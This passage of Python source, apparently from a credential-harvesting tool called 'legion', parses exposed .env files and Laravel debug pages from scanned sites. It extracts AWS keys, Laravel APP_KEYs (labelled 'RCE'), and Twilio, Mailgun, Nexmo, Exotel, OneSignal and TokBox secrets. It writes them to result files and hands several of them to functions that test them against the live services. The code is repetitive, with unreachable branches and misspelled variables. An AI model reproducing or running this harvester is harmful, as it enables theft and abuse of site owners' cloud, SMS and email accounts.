						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(Colorate.Horizontal(Colors.yellow_to_green,f"[{ntime()}] ╾┄╼ AWS [{aws_key}:{aws_sec}]"))
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AWS_ACCESS_KEY_ID_2" in str(text):
				if "AWS_ACCESS_KEY_ID_2=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nAWS_ACCESS_KEY_ID_2=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWS_SECRET_ACCESS_KEY_2=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_ACCESS_KEY_ID_2</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_ACCESS_KEY_ID_2<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_SECRET_ACCESS_KEY_2<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(Colorate.Horizontal(Colors.yellow_to_green,f"[{ntime()}] ╾┄╼ AWS [{aws_key}:{aws_sec}]"))
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "WAS_ACCESS_KEY_ID" in str(text):
				if "WAS_ACCESS_KEY_ID=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nWAS_ACCESS_KEY_ID=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nWAS_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>WAS_ACCESS_KEY_ID</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>WAS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>WAS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(Colorate.Horizontal(Colors.yellow_to_green,f"[{ntime()}] ╾┄╼ AWS [{aws_key}:{aws_sec}]"))
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			else:
				if "AKIA" in str(text):
					save = open('Results/AKIA.txt','a')
					save.write(str(url)+'\n')
					save.close()
				return False
		except:
			return False
	def get_appkey(self, text, url):
		try:
			if "APP_KEY =" in text or "APP_KEY=":
				method =  '/.env'
				try:
					appkey = reg('\nAPP_KEY=(.*?)\n', text)[0]
				except:
					try:
						appkey = appkey = reg('\nAPP_KEY = (.*?)\n', text)[0]
					except:
						appkey = False
			elif "<td>APP_KEY</td>" in text:
				method = 'debug'
				appkey = reg('<td>APP_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]

			if appkey:
				build = str(url) + '|' + appkey
				remover = str(build).replace('\r', '')
				print(Colorate.Horizontal(Colors.yellow_to_green,f"[{ntime()}] ╾┄╼ RCE [{appkey}]"))
				save = open(o_keya, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			else:
				return False
		except:
			return False
	def get_twillio2(self, text, url):
		try:
			if "TWILIO" in text:
				if "TWILIO_ACCOUNT_SID=" in text:
					method = '/.env'
					try:
						acc_sid = reg('\nTWILIO_ACCOUNT_SID=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = reg('\nTWILIO_AUTH_TOKEN=(.*?)\n', text)[0]
					except:
						auhtoken = ''
				elif '<td>TWILIO_ACCOUNT_SID</td>' in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = reg('<td>TWILIO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						auhtoken = ''

				build_forchecker = str(acc_sid)+"|"+str(auhtoken)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_twilio2,'a')
				save2.write(remover2+'\n')
				save2.close()
				legiontwilio2(acc_sid, auhtoken)
				return True
			elif "TWILIO" in text:
				if "#TWILIO_ACCOUNT_SID=" in text:
					method = '/.env'
					try:
						acc_sid = reg('\n#TWILIO_ACCOUNT_SID=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = reg('\n#TWILIO_AUTH_TOKEN=(.*?)\n', text)[0]
					except:
						auhtoken = ''
				elif '<td>TWILIO_ACCOUNT_SID</td>' in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>#TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = reg('<td>#TWILIO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						auhtoken = ''
				build_forchecker = str(acc_sid)+"|"+str(auhtoken)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_twilio2,'a')
				save2.write(remover2+'\n')
				save2.close()
				legiontwilio2(acc_sid, auhtoken)
				return True
			elif "TWILIO" in text:
				if "#TWILIO_SID=" in text:
					method = '/.env'
					try:
						acc_sid = reg('\n#TWILIO_SID=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = reg('\n#TWILIO_TOKEN=(.*?)\n', text)[0]
					except:
						auhtoken = ''
				elif '<td>TWILIO_SID</td>' in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>#TWILIO_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = reg('<td>#TWILIO_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						auhtoken = ''
				build_forchecker = str(acc_sid)+"|"+str(auhtoken)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_twilio2,'a')
				save2.write(remover2+'\n')
				save2.close()
				legiontwilio2(acc_sid, auhtoken)
				return True
			elif "TWILIO" in text:
				if "TWILIO_SID=" in text:
					method = '/.env'
					try:
						acc_sid = reg('\nTWILIO_SID=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = reg('\nTWILIO_TOKEN=(.*?)\n', text)[0]
					except:
						auhtoken = ''
				elif '<td>TWILIO_SID</td>' in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>TWILIO_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = reg('<td>TWILIO_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						auhtoken = ''
				build_forchecker = str(acc_sid)+"|"+str(auhtoken)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_twilio2,'a')
				save2.write(remover2+'\n')
				save2.close()
				legiontwilio2(acc_sid, auhtoken)
				return True
			elif "TWILIO" in text:
				if "ACCOUNT_SID=" in text:
					method = '/.env'
					try:
						acc_sid = reg('\nACCOUNT_SID=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = reg('\nAUTH_TOKEN=(.*?)\n', text)[0]
					except:
						auhtoken = ''
				elif '<td>ACCOUNT_SID</td>' in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = reg('<td>AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						auhtoken = ''
				build_forchecker = str(acc_sid)+"|"+str(auhtoken)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_twilio2,'a')
				save2.write(remover2+'\n')
				save2.close()
				legiontwilio2(acc_sid, auhtoken)
				return True
			elif "TWILIO" in text:
				if "TWILIO_SID=" in text:
					method = '/.env'
					try:
						acc_sid = reg('TWILIO_SID=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = reg('TWILIO_TOKEN=(.*?)\n', text)[0]
					except:
						auhtoken = ''
				elif '<td>TWILIO_SID</td>' in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>TWILIO_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = reg('<td>TWILIO_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						auhtoken = ''
				build_forchecker = str(acc_sid)+"|"+str(auhtoken)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_twilio2,'a')
				save2.write(remover2+'\n')
				save2.close()
				legiontwilio2(acc_sid, auhtoken)
				return True
			elif "TWILIO" in text:
				if "#TWILIO_SID=" in text:
					method = '/.env'
					try:
						acc_sid = reg('#TWILIO_SID=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = reg('#TWILIO_TOKEN=(.*?)\n', text)[0]
					except:
						auhtoken = ''
				elif '<td>TWILIO_SID</td>' in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>#TWILIO_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = reg('<td>#TWILIO_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						auhtoken = ''
				build_forchecker = str(acc_sid)+"|"+str(auhtoken)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_twilio2,'a')
				save2.write(remover2+'\n')
				save2.close()
				legiontwilio2(acc_sid, auhtoken)
				return True
			elif "SMS_API_SENDER_ID" in text:
				if "SMS_API_SENDER_ID=" in text:
					method = '/.env'
					try:
						acc_sid = reg('\nSMS_API_SENDER_ID=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						authtoken = reg('\nSMS_API_TOKEN=(.*?)\n', text)[0]
					except:
						authtoken = ''
					try:
						phone = reg('\nSMS_API_FROM=(.*?)\n', text)[0]
					except:
						phone = ''
				elif "<td>SMS_API_SENDER_ID</td>" in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>SMS_API_SENDER_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						authtoken = reg('<td>SMS_API_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						authtoken = ''
					try:
						phone = reg('<td>SMS_API_FROM<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						phone = ''


				build_forchecker = str(acc_sid)+"|"+str(auhtoken)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_twilio2,'a')
				save2.write(remover2+'\n')
				save2.close()
				legiontwilio2(acc_sid, auhtoken)
				return True
			elif "TWILIO_SID" in text:
				if "TWILIO_SID=" in text:
					method = '/.env'
					try:
						acc_sid = reg('\nTWILIO_SID=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						authtoken = reg('\nTWILIO_TOKEN=(.*?)\n', text)[0]
					except:
						authtoken = ''
					try:
						phone = reg('\nTWILIO_NUMBER=(.*?)\n', text)[0]
					except:
						phone = ''
				elif "<td>TWILIO_SID</td>" in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>TWILIO_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						authtoken = reg('<td>TWILIO_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						authtoken = ''
					try:
						phone = reg('<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						phone = ''


				build_forchecker = str(acc_sid)+"|"+str(auhtoken)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_twilio2,'a')
				save2.write(remover2+'\n')
				save2.close()
				legiontwilio2(acc_sid, auhtoken)
				return True
			elif "=AC" in text:
				build = str(url)+' | '+str(method)
				remover = str(build).replace('\r', '')
				save = open(o_twiliom, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			else:
				return False
		except:
			return False
	def get_mailgun(self, text, url):
		try:
			if "MAILGUN_DOMAIN" in text:
				if "MAILGUN_SECRET=" in text:
					method = '/.env'
					try:
						acc_sid = reg('\nMAILGUN_DOMAIN=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						acc_key = reg('\nMAILGUN_SECRET=(.*?)\n', text)[0]
					except:
						acc_key = ''
					try:
						sec = reg('\nMAILGUN_ENDPOINT=(.*?)\n', text)[0]
					except:
						sec = ''
				elif '<td>MAILGUN_DOMAIN</td>' in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>MAILGUN_DOMAIN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						acc_key = reg('<td>MAILGUN_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_key = ''
					try:
						sec = reg('<td>MAILGUN_ENDPOINT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						sec = ''

				build = str(acc_sid)+'|'+str(acc_key)+'|'+str(acc_key)+'|'+str(sec)
				remover = str(build).replace('\r', '')
				print(Colorate.Horizontal(Colors.yellow_to_green,f"[{ntime()}] ╾┄╼ MAILGUN [{acc_sid}:{acc_key}]"))
				save = open(o_mgapi, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "SMS_API_SENDER_ID" in text:
				if "SMS_API_SENDER_ID=" in text:
					method = '/.env'
					try:
						acc_sid = reg('\nSMS_API_SENDER_ID=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						authtoken = reg('\nSMS_API_TOKEN=(.*?)\n', text)[0]
					except:
						authtoken = ''
					try:
						phone = reg('\nSMS_API_FROM=(.*?)\n', text)[0]
					except:
						phone = ''
				elif "<td>SMS_API_SENDER_ID</td>" in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>SMS_API_SENDER_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						authtoken = reg('<td>SMS_API_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						authtoken = ''
					try:
						phone = reg('<td>SMS_API_FROM<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						phone = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSMS_API_SENDER_ID: '+str(acc_sid)+'\nSMS_API_TOKEN: '+str(auhtoken)+'\nSMS_API_FROM: '+str(phone)
				remover = str(build).replace('\r', '')
				print(Colorate.Horizontal(Colors.yellow_to_green,f"[{ntime()}] ╾┄╼ SMS [{acc_sid}:{authtoken}]"))
				save = open(o_twilio, 'a')
				save.write(remover+'\n')
				save.close()
				legiontwilio2(acc_sid,authtoken)
				build_forchecker = str(acc_sid)+"|"+str(auhtoken)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_twilio2,'a')
				save2.write(remover2+'\n')
				save2.close()
				return True
			elif "TWILIO_SID" in text:
				if "TWILIO_SID=" in text:
					method = '/.env'
					try:
						acc_sid = reg('\nTWILIO_SID=(.*?)\n', text)[0]
					except:
						acc_sid = ''
					try:
						authtoken = reg('\nTWILIO_TOKEN=(.*?)\n', text)[0]
					except:
						authtoken = ''
					try:
						phone = reg('\nTWILIO_NUMBER=(.*?)\n', text)[0]
					except:
						phone = ''
				elif "<td>TWILIO_SID</td>" in text:
					method = 'debug'
					try:
						acc_sid = reg('<td>TWILIO_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						authtoken = reg('<td>TWILIO_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						authtoken = ''
					try:
						phone = reg('<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						phone = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSTWILIO_SID: '+str(acc_sid)+'\nTWILIO_TOKEN: '+str(auhtoken)+'\nTWILIO_NUMBER: '+str(phone)
				remover = str(build).replace('\r', '')
				save = open(o_twilio, 'a')
				save.write(remover+'\n')
				print(Colorate.Horizontal(Colors.yellow_to_green,f"[{ntime()}] ╾┄╼ SMS [{acc_sid}:{authtoken}]"))
				save.close()
				build_forchecker = str(acc_sid)+"|"+str(auhtoken)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_twilio2,'a')
				save2.write(remover2+'\n')
				save2.close()
				legiontwilio2(acc_sid,authtoken)
				return True
			elif "=AC" in text:
				build = str(url)+' | '+str(method)
				remover = str(build).replace('\r', '')
				save = open(o_twiliom, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			else:
				return False
		except:
			return False
	def get_manual(self, text, url):
		try:
			if "PLIVO" in text or "plivo" in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_pliv, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "CLICKSEND" in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_click, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "MANDRILL" in text or "mandrill" in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_drill, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "MAILJET" in text or "mailjet" in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_jet, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "MAILGUN" in text or "mailgun" in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_gun, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "MESSAGEBIRD" in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_bird, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "SMS_" in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_sms, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "VONAGE" in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_von, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "NEXMO" in text or "nexmo" in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_nex, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif 'characters">AKIA' in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_aws_man, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif 'characters">AC' in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_twi, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "= AC" in text or "=AC" in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_twi, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "= AKIA" in text or "=AKIA" in text:
				build = str(url)+"/.env"
				remover = str(build).replace('\r', '')
				save = open(o_aws_man, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			else:
				return False
		except:
			return False
	def get_nexmo2(self, text, url):
		try:
			if "NEXMO" in text:
				if "NEXMO_KEY=" in text:
					method = '/.env'
					try:
						nexmo_key = reg('\nNEXMO_KEY=(.*?)\n', text)[0]
					except:
						nexmo_key = ''
					try:
						nexmo_secret = reg('\nNEXMO_SECRET=(.*?)\n', text)[0]
					except:
						nexmo_secret = ''
				elif '<td>NEXMO_KEY</td>' in text:
					method = 'debug'
					try:
						nexmo_key = reg('<td>NEXMO_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						nexmo_key = ''
					try:
						nexmo_secret = reg('<td>NEXMO_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						nexmo_secret = ''
				build = str(nexmo_key)+"|"+str(nexmo_secret)
				remover = str(build).replace('\r', '')
				print(Colorate.Horizontal(Colors.yellow_to_green,f"[{ntime()}] ╾┄╼ NEXMO [{nexmo_key}:{nexmo_secret}]"))
				save = open(o_nexmo, 'a')
				save.write(remover+'\n')
				save.close()
				login_nexmo(url,nexmo_key,nexmo_secret)
				build_forchecker = str(nexmo_key)+"|"+str(nexmo_secret)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_nexmo2,'a')
				save2.write(remover2+'\n')
				save2.close()
				return True
			elif "NEXMO_API_KEY" in text:
				if "NEXMO_API_KEY=" in text:
					method = '/.env'
					try:
						nexmo_key = reg('\nNEXMO_API_KEY=(.*?)\n', text)[0]
					except:
						nexmo_key = ''
					try:
						nexmo_secret = reg('\nNEXMO_API_SECRET=(.*?)\n', text)[0]
					except:
						nexmo_secret = ''

				elif '<td>NEXMO_API_KEY</td>' in text:
					method = 'debug'
					try:
						nexmo_key = reg('<td>NEXMO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						nexmo_key = ''
					try:
						nexmo_secret = reg('<td>NEXMO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						nexmo_secret = ''
				build = str(nexmo_key)+"|"+str(nexmo_secret)
				remover = str(build).replace('\r', '')
				print(f"{red}[{gr}{ntime()}{red}] {fc}╾┄╼ {gr}NEXMO {fc}[{yl}{nexmo_key}{res}:{fc}{nexmo_secret}{fc}]")
				save = open(o_nexmo, 'a')
				save.write(remover+'\n')
				save.close()
				login_nexmo(url,nexmo_key,nexmo_secret)
				build_forchecker = str(nexmo_key)+"|"+str(nexmo_secret)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_nexmo2,'a')
				save2.write(remover2+'\n')
				save2.close()
				return True
			elif "NEXMO_API_KEY" in text:
				if "NEXMO_API_KEY=" in text:
					method = '/.env'
					try:
						nexmo_key = reg('NEXMO_API_KEY=(.*?)\n', text)[0]
					except:
						nexmo_key = ''
					try:
						nexmo_secret = reg('NEXMO_API_SECRET=(.*?)\n', text)[0]
					except:
						nexmo_secret = ''

				elif 'NEXMO_KEY' in text:
					method = 'debug'
					try:
						nexmo_key = reg('NEXMO_KEY=(.*?)\n', text)[0]
					except:
						nexmo_key = ''
					try:
						nexmo_secret = reg('NEXMO_SECRET=(.*?)\n', text)[0]
					except:
						nexmo_secret = ''
				build = str(nexmo_key)+"|"+str(nexmo_secret)
				remover = str(build).replace('\r', '')
				print(f"{red}[{gr}{ntime()}{red}] {fc}╾┄╼ {gr}NEXMO {fc}[{yl}{nexmo_key}{res}:{fc}{nexmo_secret}{fc}]")
				save = open(o_nexmo, 'a')
				save.write(remover+'\n')
				save.close()
				login_nexmo(url,nexmo_key,nexmo_secret)
				build_forchecker = str(nexmo_key)+"|"+str(nexmo_secret)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open(o_nexmo2,'a')
				save2.write(remover2+'\n')
				save2.close()
				return True
			elif "EXOTEL_API_KEY" in text:
				if "EXOTEL_API_KEY=" in text:
					method = '/.env'
					try:
						exotel_api = reg('\nEXOTEL_API_KEY=(.*?)\n', text)[0]
					except:
						exotel_api = ''
					try:
						exotel_token = reg('\nEXOTEL_API_TOKEN=(.*?)\n', text)[0]
					except:
						exotel_token = ''
					try:
						exotel_sid = reg('\nEXOTEL_API_SID=(.*?)\n', text)[0]
					except:
						exotel_sid = ''
				elif '<td>EXOTEL_API_KEY</td>' in text:
					method = 'debug'
					try:
						exotel_api = reg('<td>EXOTEL_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						exotel_api = ''
					try:
						exotel_token = reg('<td>EXOTEL_API_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						exotel_token = ''
					try:
						exotel_sid = reg('<td>EXOTEL_API_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						exotel_sid = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nEXOTEL_API_KEY: '+str(exotel_api)+'\nEXOTEL_API_TOKEN: '+str(exotel_token)+'\nEXOTEL_API_SID: '+str(exotel_sid)
				remover = str(build).replace('\r', '')
				save = open(o_exo, 'a')
				save.write(remover+'\n')
				print(f"{red}[{gr}{ntime()}{red}] {fc}╾┄╼ {gr}EXOTEL {fc}[{yl}{exotel_api}{res}:{fc}{exotel_token}{fc}]")
				save.close()
				return True
			elif "ONESIGNAL_APP_ID" in text:
				if "ONESIGNAL_APP_ID=" in text:
					method = '/.env'
					try:
						onesignal_id = reg('\nONESIGNAL_APP_ID=(.*?)\n', text)[0]
					except:
						onesignal_id = ''
					try:
						onesignal_token = reg('\nONESIGNAL_REST_API_KEY=(.*?)\n', text)[0]
					except:
						onesignal_id = ''
					try:
						onesignal_auth = reg('\nONESIGNAL_USER_AUTH_KEY=(.*?)\n', text)[0]
					except:
						onesignal_auth = ''
				elif '<td>ONESIGNAL_APP_ID</td>' in text:
					method = 'debug'
					try:
						onesignal_id = reg('<td>ONESIGNAL_APP_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						onesignal_id = ''
					try:
						onesignal_token = reg('<td>ONESIGNAL_REST_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						onesignal_token = ''
					try:
						onesignal_auth = reg('<td>ONESIGNAL_USER_AUTH_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						onesignal_auth = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nONESIGNAL_APP_ID: '+str(onesignal_id)+'\nONESIGNAL_REST_API_KEY: '+str(onesignal_token)+'\nONESIGNAL_USER_AUTH_KEY: '+str(onesignal_auth)
				remover = str(build).replace('\r', '')
				print(f"{red}[{gr}{ntime()}{red}] {fc}╾┄╼ {gr}ONESIGNAL {fc}[{yl}{onesignal_id}{res}:{fc}{onesignal_token}{fc}]")
				save = open(o_one, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "TOKBOX_KEY_DEV" in text:
				if "TOKBOX_KEY_DEV=" in text:
					method = '/.env'
					try:
						tokbox_key = reg('\nTOKBOX_KEY_DEV=(.*?)\n', text)[0]
					except:
						tokbox_key = ''
					try:
						tokbox_secret = reg('\nTOKBOX_SECRET_DEV=(.*?)\n', text)[0]
					except:
						tokbox_secret = ''
				elif '<td>TOKBOX_KEY_DEV</td>' in text:
					method = 'debug'
					try:
						tokbox_key = reg('<td>TOKBOX_KEY_DEV<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						tokbox_key = ''
					try:
						tokbox_secret = reg('<td>TOKBOX_SECRET_DEV<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						tokbox_secret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
				remover = str(build).replace('\r', '')
				print(f"{red}[{gr}{ntime()}{red}] {fc}╾┄╼ {gr}TOKBOX {fc}[{yl}{tokbox_key}{res}:{fc}{tokbox_key}{fc}]")
				save = open(o_tok, 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "TOKBOX_KEY" in text:
				if "TOKBOX_KEY=" in text:
					method = '/.env'
					try:
